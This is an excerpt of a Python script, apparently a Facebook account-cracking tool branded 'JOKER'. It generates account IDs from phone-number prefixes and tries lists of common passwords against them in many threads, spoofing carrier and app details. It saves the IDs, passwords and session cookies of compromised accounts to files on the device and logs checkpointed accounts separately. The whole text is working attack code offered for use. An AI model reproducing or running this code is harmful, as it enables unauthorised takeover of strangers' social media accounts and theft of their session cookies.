...
\033[1;39m======================================================
\033[1;39m :AUTHER   : PRINCE JOKER 
\033[1;39m :Facebook : PRINCE SALAR 
\033[1;39m :FRIEND   :   SHAHI JOKER
\033[1;39m :VERSION  : 2.8
\033[1;39m======================================================
\033[1;39m           RAEES JOKER               PRINCE JOKER
\033[1;39m======================================================
\033[1;39m           SHAHI JOKER               PRINCE JOKER
\033[1;39m======================================================'"""
def linex():
	print('\033[1;36m-'*51)
def clear():
...
def pak():
                user=[]
                clear()
                print('\033[1;37m [\033[1;32m✓\033[1;37m] Example : \033[1;32m9397,9370,9388,9378,9337'),linex()
                ...
                with tred(max_workers=30) as ARIX:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'Afghan123','Arman123','Armanoo','Afghan1234','Ahmad12345','Afghan12345','King500600','pubg123','Khan123','pubg king','pubg pubg','Khan500600','Arman Khan','۱۲۳۴۵۶','۱۲۳۴۵۶۷۸۹','Ahmad123']
...
def ffb(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [JOKER] %s| \033[1;37mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        network = random.choice(['AWCC','ROSHAN','ETISALAT','MTN','SALAM'])
                        ...
                        if 'session_key' in po:
                                        print('\r\r\033[1;32m [JOKER] '+ids+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                      
                                        open('/sdcard/JOKER-OK-COKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/JOKER-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[JOKER] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [JOKER] '+ids+' | '+pas+'\033[1;97m')
...
'Content-Length': '706'}
                        ...
                        if 'session_key' in po:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [CP-JOKER] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/JOKER-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
...
def api1(ids,names,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;32m [JOKER] %s| \033[1;32mOK : \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [OK-JOKER] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOKER-OK.txt','a').write(ids+'|'+pas+'\n')                                        
                                        oks.append(ids)
                                        break
                                elif 'www.facebook.com' in q['error']['message']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;31m [CP-JOKER] '+ids+' | '+pas+'\033[1;97m')                                                
                                                open('/sdcard/JOKER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
...
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [JOKER] %s| \033[1;32mOK \033[1;37m: \033[1;32m%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [OK-JOKER] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])                                       
                                        open('/sdcard/JOKER-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        open('/sdcard/JOKER-OK-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[1;31m [CP-JOKER] '+str(uid)+' | '+pas+'\033[1;97m')                                     
                                        open('/sdcard/JOKER-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
